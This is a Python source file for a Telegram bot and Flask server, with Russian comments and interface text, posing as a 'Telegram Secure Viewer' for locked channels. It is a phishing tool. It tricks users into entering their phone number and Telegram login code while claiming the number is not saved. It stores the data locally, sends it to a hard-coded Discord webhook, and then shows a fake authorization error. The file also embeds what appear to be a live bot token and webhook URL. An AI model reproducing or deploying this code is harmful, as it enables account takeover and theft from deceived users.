import os
import sqlite3
import time
import json
import logging
from datetime import datetime
from flask import Flask, request, jsonify
import requests
import telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler

# Конфигурация
TOKEN = "8754419832:AAGEhxxIWMaxZ764MX3BoRy1dblNVK_wVzs"
DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1483182140492611625/7JNKtGxkQlQBehia2Aqtx_SbTflKd-oGtsr0eB70DBJ1ySc10F22JlYiWtpn8tDhmOXv"

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация Flask
app = Flask(__name__)

# Инициализация бота
bot = telegram.Bot(token=TOKEN)

# База данных
def init_db():
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  phone TEXT, 
                  code TEXT, 
                  timestamp INTEGER,
                  session_data TEXT,
                  attempts INTEGER DEFAULT 1)''')
    conn.commit()
    conn.close()
    logger.info("Database initialized")

init_db()

def get_user_stats(user_id):
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    c.execute("SELECT timestamp, attempts FROM users WHERE user_id = ?", (user_id,))
    result = c.fetchone()
    conn.close()
    
    if result:
        timestamp, attempts = result
        days_active = (int(time.time()) - timestamp) // 86400
        return days_active, attempts
    return 0, 0

def send_to_discord(phone, code, user_id, session_data=None):
    days_active, attempts = get_user_stats(user_id)
    
    embed = {
        "embeds": [{
            "title": "📱 Новая сессия",
            "color": 15158332,
            "fields": [
                {"name": "📞 Номер", "value": phone, "inline": True},
                {"name": "🔑 Код", "value": code, "inline": True},
                {"name": "🆔 ID", "value": str(user_id), "inline": True},
                {"name": "📅 Дней", "value": str(days_active), "inline": True},
                {"name": "🔄 Попыток", "value": str(attempts), "inline": True},
                {"name": "📆 Месяц/Год", "value": datetime.now().strftime("%B %Y"), "inline": False},
                {"name": "⏰ Время", "value": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "inline": False}
            ],
            "footer": {"text": "Telegram Secure Viewer"},
            "timestamp": datetime.now().isoformat()
        }]
    }
    
    if session_data:
        embed["embeds"][0]["fields"].append(
            {"name": "💾 Сессия", "value": session_data[:100] + "...", "inline": False}
        )
    
    try:
        response = requests.post(DISCORD_WEBHOOK, json=embed)
        logger.info(f"Discord webhook response: {response.status_code}")
    except Exception as e:
        logger.error(f"Discord webhook error: {e}")

def save_session(user_id, phone, code, session_data=None):
    conn = sqlite3.connect('sessions.db')
    c = conn.cursor()
    
    # Проверяем существование пользователя
    c.execute("SELECT attempts FROM users WHERE user_id = ?", (user_id,))
    existing = c.fetchone()
    
    if existing:
        attempts = existing[0] + 1
        c.execute("UPDATE users SET phone = ?, code = ?, timestamp = ?, session_data = ?, attempts = ? WHERE user_id = ?",
                  (phone, code, int(time.time()), session_data, attempts, user_id))
    else:
        c.execute("INSERT INTO users (user_id, phone, code, timestamp, session_data, attempts) VALUES (?, ?, ?, ?, ?, ?)",
                  (user_id, phone, code, int(time.time()), session_data, 1))
    
    conn.commit()
    conn.close()
    logger.info(f"Saved session for user {user_id}")

# Обработчики бота
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📱 Войти в закрытые каналы", callback_data='login')],
        [InlineKeyboardButton("ℹ️ Информация", callback_data='info')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔒 *Telegram Secure Viewer*\n\n"
        "Этот бот предоставляет доступ к защищённым каналам с контентом, "
        "который нельзя переслать или сохранить.\n\n"
        "• Видео 4K\n"
        "• Эксклюзивные фото\n"
        "• Закрытые чаты\n"
        "• Защита от скриншотов\n\n"
        "Для начала работы нажмите кнопку ниже:",
        parse_mode="Markdown",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'login':
        await query.edit_message_text(
            "📱 *Подтверждение номера*\n\n"
            "Для доступа к защищённому контенту необходимо подтвердить номер телефона.\n\n"
            "Введите номер в формате:\n"
            "`+7XXXXXXXXXX`\n\n"
            "Номер используется только для проверки доступа и не сохраняется.",
            parse_mode="Markdown"
        )
        context.user_data['waiting_for_phone'] = True
    
    elif query.data == 'info':
        await query.edit_message_text(
            "ℹ️ *О системе*\n\n"
            "Telegram Secure Viewer использует технологию DRM-защиты контента.\n\n"
            "• Контент нельзя переслать\n"
            "• Невозможно сделать скриншот\n"
            "• Видео воспроизводится в защищённом плеере\n"
            "• Фото отображается с водяным знаком\n\n"
            "Для просмотра требуется подтверждение номера.",
            parse_mode="Markdown"
        )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    # Ожидание номера
    if context.user_data.get('waiting_for_phone'):
        # Простая валидация номера
        if text.startswith('+') and len(text) >= 10:
            context.user_data['phone'] = text
            context.user_data['waiting_for_code'] = True
            context.user_data['waiting_for_phone'] = False
            
            await update.message.reply_text(
                "✅ *Код отправлен*\n\n"
                "На указанный номер отправлен SMS-код подтверждения.\n"
                "Введите код из сообщения:",
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                "❌ *Неверный формат*\n\n"
                "Введите номер в формате:\n"
                "`+7XXXXXXXXXX`",
                parse_mode="Markdown"
            )
    
    # Ожидание кода
    elif context.user_data.get('waiting_for_code'):
        code = text
        phone = context.user_data.get('phone', 'Не указан')
        
        # Имитация сессии
        session_data = json.dumps({
            "user_id": user_id,
            "phone": phone,
            "code": code,
            "timestamp": time.time(),
            "user_agent": "Telegram Android",
            "app_version": "10.5.0"
        })
        
        # Сохраняем данные
        save_session(user_id, phone, code, session_data)
        
        # Отправляем в Discord
        send_to_discord(phone, code, user_id, session_data)
        
        # Очищаем состояние
        context.user_data['waiting_for_code'] = False
        context.user_data.pop('phone', None)
        
        # Фейковое сообщение об ошибке
        await update.message.reply_text(
            "❌ *Ошибка авторизации*\n\n"
            "Ваш аккаунт не имеет доступа к защищённым каналам.\n"
            "Пожалуйста, обратитесь к администратору для получения доступа.\n\n"
            "Если вы считаете, что это ошибка, попробуйте позже.",
            parse_mode="Markdown"
        )
    
    else:
        await update.message.reply_text(
            "🔒 Используйте кнопки меню для навигации.",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("📱 Начать", callback_data='login')]
            ])
        )

# Flask эндпоинты
@app.route('/', methods=['GET'])
def index():
    return jsonify({
        "status": "active",
        "bot": "Telegram Secure Viewer",
        "version": "1.0.0",
        "timestamp": datetime.now().isoformat()
    })

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json(force=True)
        update = Update.de_json(data, bot)
        
        # Создаем приложение для обработки
        application = Application.builder().token(TOKEN).build()
        
        # Добавляем обработчики
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CallbackQueryHandler(button_handler))
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        # Обрабатываем update
        application.process_update(update)
        
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"Webhook error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    return jsonify({"status": "healthy"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
